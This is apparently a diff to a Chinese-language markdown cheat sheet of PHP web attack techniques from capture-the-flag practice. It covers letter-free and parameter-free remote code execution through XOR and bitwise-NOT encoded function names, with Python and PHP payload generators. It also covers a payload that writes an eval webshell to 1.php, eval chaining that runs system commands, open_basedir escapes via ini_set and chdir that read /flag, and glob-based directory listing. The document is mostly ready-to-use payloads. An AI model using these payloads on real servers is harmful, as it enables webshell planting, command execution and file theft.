@@ -1,3 +1,11 @@
+## 连接绕过
+
+```
+var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+```
+
+
+
 ## 无字母RCE
 
 PHP7前是不允许用`($a)();`这样的方法来执行动态函数的，但PHP7中增加了对此的支持，我们可以通过`('phpinfo')();`来执行函数
@@ -6,13 +14,13 @@ PHP7前是不允许用`($a)();`这样的方法来执行动态函数的，但PHP7
 
 ```
 <?php
-	$a ="phpinfo";
-	$b ="";
-	echo "(~";
-	echo urlencode(~$a);
-	print(")(~");
-	echo urlencode(~$b);
-	echo ");";
+    $a ="phpinfo";
+    $b ="";
+    echo "(~";
+    echo urlencode(~$a);
+    print(")(~");
+    echo urlencode(~$b);
+    echo ");";
 ?>
 ```
 
@@ -20,7 +28,7 @@ PHP7前是不允许用`($a)();`这样的方法来执行动态函数的，但PHP7
 
 ```python
 import re  
-  
+
 content = ''  
 preg = '[A-Za-z0-9]+'  # 题目过滤正则  
 # 生成字典  
@@ -34,7 +42,7 @@ for i in range(256):
                 content += (chr(k) + ' ' + a + ' ' + b + '\n')  
 f = open('rce_or.txt', 'w')  
 f.write(content)  
-  
+
 while True:  
     payload1 = ''  
     payload2 = ''  
@@ -136,9 +144,9 @@ while True:
 
 ```
 valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
- 
+
 answer = "phpinfo"
- 
+
 tmp1,tmp2 = '',''
 for c in answer:
     for i in valid:
@@ -166,8 +174,6 @@ mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
 &_=file_put_contents('1.php','<?php @eval($_POST["shell"]); ?>')
 ```
 
-
-
 ## 无参数&&无字母RCE
 
 ```
@@ -175,14 +181,8 @@ mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
 
 例如：
 [~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));
-system(current(getallheaders()));
+//system(current(getallheaders()));
 ```
-
-
-
-
-
-
 
 #### 临时文件或通配符
 
@@ -191,7 +191,7 @@ system(current(getallheaders()));
 
 [无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
 
-### 引用绕过
+## 引用绕过
 
 ```
 c=eval($_GET[a]);&a=system('cat flag.php');
@@ -199,7 +199,7 @@ c=eval($_GET[a]);&a=system('cat flag.php');
 当第一次传c时，c只是字符串，而eval之后变成了语句，则可传入a
 ```
 
-### open_basedir绕过
+## open_basedir绕过
 
 **读取目录**
 
@@ -209,12 +209,9 @@ basckdoor=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toS
 
 [PHP绕过open_basedir列目录的研究 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)
 
-
-
 **读取文件**
 
 ```php
-
 软链接进行绕过
 syslink(target,link) 对于已有的target建立一个名为link的符号连接
 ```
@@ -234,13 +231,9 @@ ini_set绕过
 ini_set(varname,newvalue) 设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复
 ```
 
-
-
 ```
 应用实例：_=file_put_contents('1.php',"<?php print_r(ini_get('open_basedir').'<br>'); mkdir('test'); chdir('test'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); echo file_get_contents('/flag'); print(1);?> ");
 ```
-
-
 
 ```
 蚁剑连接
@@ -254,9 +247,7 @@ glob:// : 查找匹配的文件路径模式(支持正则表达式)
 可用于查找爆破，因为glob支持正则，可以进行快速爆破
 ```
 
-
-
-### disable_Function绕过
+## disable_Function绕过
 
 ```
 PHP-fpm绕过
